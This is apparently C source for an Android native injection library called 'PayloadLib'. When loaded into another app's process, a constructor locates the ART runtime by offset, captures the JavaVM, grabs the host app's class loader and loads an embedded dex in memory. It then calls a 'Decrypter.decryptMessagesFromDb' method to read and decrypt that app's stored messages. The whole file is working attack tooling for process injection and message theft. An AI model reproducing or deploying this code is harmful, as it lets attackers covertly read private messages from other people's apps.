#include <jni.h>
#include <dlfcn.h>
#include <stdio.h>
#include <android/log.h>
#include "address_finder.h"
#include "msgs_dex.h"

#define LOG_TAG "PayloadLib"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

JNIEnv *g_env = NULL;
jclass g_classLoaderClass;
jmethodID g_loadClassMethod;
jobject g_classLoaderObj;

typedef jint (*JNI_GetCreatedJavaVMs_t)(JavaVM **, jsize, jsize *);


void get_msgs_via_dex(jobject context);

__attribute__((constructor)) void init_lib(void) {
    uintptr_t libart_base = find_module_base(0, "libart.so");
    if (!libart_base) return;

    uintptr_t offset = find_created_vms_offset();

    JNI_GetCreatedJavaVMs_t get_vms = (JNI_GetCreatedJavaVMs_t) ((char *) libart_base + offset);

    LOGI("[+] Vm Pointer: %p\n", get_vms);

    JavaVM *vm = NULL;
    jsize count = 0;

    if (get_vms(&vm, 1, &count) == JNI_OK && count > 0) {
        LOGI("[+] SUCESS! JavaVM captured: %p\n", vm);

        if ((*vm)->AttachCurrentThread(vm, &g_env, NULL) != JNI_OK) {
            LOGI("[-] Failed to attach current thread.\n");
            return;
        }

        jclass activityThreadClass = (*g_env)->FindClass(g_env, "android/app/ActivityThread");
        if (activityThreadClass == NULL) {
            LOGI("[-] Faio to find android.app.ActivityThread\n");
            (*g_env)->ExceptionClear(g_env);

            return;
        }
        LOGI("[+] SUCCESS Found android.app.ActivityThread\n");

        jmethodID currentAppMethod = (*g_env)->GetStaticMethodID(g_env, activityThreadClass, "currentApplication",
                                                                 "()Landroid/app/Application;");
        jobject appObj = (*g_env)->CallStaticObjectMethod(g_env, activityThreadClass, currentAppMethod);

        if (appObj == NULL) {
            LOGI("[-] AppObj is NULL \n");
            (*g_env)->ExceptionClear(g_env);

            return;
        }
        LOGI("[+] AppObj is Sucess!\n");

        jclass appClass = (*g_env)->GetObjectClass(g_env, appObj);
        jmethodID getClassLoaderMethod = (*g_env)->GetMethodID(g_env, appClass, "getClassLoader",
                                                               "()Ljava/lang/ClassLoader;");
        g_classLoaderObj = (*g_env)->CallObjectMethod(g_env, appObj, getClassLoaderMethod);

        g_classLoaderClass = (*g_env)->GetObjectClass(g_env, g_classLoaderObj);
        g_loadClassMethod = (*g_env)->GetMethodID(g_env, g_classLoaderClass, "loadClass",
                                                  "(Ljava/lang/String;)Ljava/lang/Class;");

        get_msgs_via_dex(appObj);
    }
}

void get_msgs_via_dex(jobject context) {
    
    jobject byteBuffer = (*g_env)->NewDirectByteBuffer(g_env, classes_dex, classes_dex_len);
    if (byteBuffer == NULL) return;

    jclass dexLoaderClass = (*g_env)->FindClass(g_env, "dalvik/system/InMemoryDexClassLoader");
    if (dexLoaderClass == NULL) return;

    jmethodID loaderConstructor = (*g_env)->GetMethodID(g_env, dexLoaderClass, "<init>", "(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V");

     // Always use the buffer never the raw classes_dex
    jobject dexLoader = (*g_env)->NewObject(g_env, dexLoaderClass, loaderConstructor, byteBuffer, g_classLoaderObj);
    if (dexLoader == NULL) return;

    // ATTENTION: use the packagename you used in your .java file plus the class name
    jstring myClassName = (*g_env)->NewStringUTF(g_env, "com.example.injectedclass.Decrypter");

    // Find the injected class
    jclass decrypterClass = (jclass) (*g_env)->CallObjectMethod(g_env, dexLoader, g_loadClassMethod, myClassName);

    if (decrypterClass == NULL) return;

    jmethodID decryptMessagesFromDb = (*g_env)->GetStaticMethodID(g_env, decrypterClass, "decryptMessagesFromDb", "(Landroid/content/Context;)V");
    if (decryptMessagesFromDb == NULL) return;

    (*g_env)->CallStaticVoidMethod(g_env, decrypterClass, decryptMessagesFromDb, context);


    if ((*g_env)->ExceptionCheck(g_env)) {
        (*g_env)->ExceptionDescribe(g_env);
        (*g_env)->ExceptionClear(g_env);
    }
}
